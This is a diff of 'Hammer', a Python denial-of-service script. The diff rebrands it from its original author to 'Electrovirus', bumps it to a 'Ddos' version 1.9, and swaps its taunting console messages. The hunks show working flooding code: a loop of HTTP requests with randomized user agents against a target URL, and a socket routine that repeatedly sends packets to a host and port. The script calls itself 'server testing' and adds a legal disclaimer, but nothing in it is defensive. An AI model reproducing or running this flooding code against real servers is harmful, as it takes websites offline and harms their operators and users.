@@ -1,9 +1,11 @@
 #!/usr/bin/python3
 # -*- coding: utf-8 -*-
 
-# python 3.3.2+ Hammer Dos Script v.1
-# by Can Yalçın
+# python 3 Hammer Ddos Script v.1.9
+# by Electrovirus
 # only for legal purpose
+#This script is created with love in IRAN
+#
 
 
 from queue import Queue
@@ -35,7 +37,7 @@ def bot_hammering(url):
 	try:
 		while True:
 			req = urllib.request.urlopen(urllib.request.Request(url,headers={'User-Agent': random.choice(uagent)}))
-			print("\033[94mWe are fucking it =)...\033[0m")
+			print("\033[94mThe website is under attack EV is here :)...\033[0m")
 			time.sleep(.1)
 	except:
 		time.sleep(.1)
@@ -49,13 +51,13 @@ def down_it(item):
 			s.connect((host,int(port)))
 			if s.sendto( packet, (host, int(port)) ):
 				s.shutdown(1)
-				print ("\033[92m",time.ctime(time.time()),"\033[0m \033[94m <--Server is getting fucked=)--> \033[0m")
+				print ("\033[92m",time.ctime(time.time()),"\033[0m \033[94m <--Website servers are going down :)--> \033[0m")
 			else:
 				s.shutdown(1)
 				print("\033[91mshut<->down\033[0m")
 			time.sleep(.1)
 	except socket.error as e:
-		print("\033[91It had been fucked=)\033[0m")
+		print("\033[91Website is down no ping recieved ElectroVirus fucked u :)\033[0m")
 		#print("\033[91m",e,"\033[0m")
 		time.sleep(.1)
 
@@ -75,7 +77,7 @@ def dos2():
 
 
 def usage():
-	print (''' \033[92m	Hammer Dos Script v.1 http://www.canyalcin.com/
+	print (''' \033[92m	Hammer Ddos Script v.1 by Electrovirus
 	It is the end user's responsibility to obey all applicable laws.
 	It is just for server testing script. Your ip is visible. \n
 	usage : python3 hammer.py [-s] [-p] [-t]
